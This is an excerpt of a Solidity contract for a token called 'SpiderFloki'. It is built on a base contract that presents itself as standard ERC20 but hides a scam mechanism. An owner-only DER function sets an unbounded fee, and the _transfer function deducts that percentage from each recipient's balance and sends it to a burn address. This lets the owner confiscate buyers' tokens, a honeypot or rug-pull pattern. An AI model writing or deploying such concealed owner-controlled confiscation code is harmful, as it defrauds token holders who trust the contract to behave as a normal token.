...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function DER(uint256 DER) external onlyOwner(){
        _der = DER;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _der);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _der);
...
contract SpiderFloki is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("SpiderFloki", "SpiderFloki") {
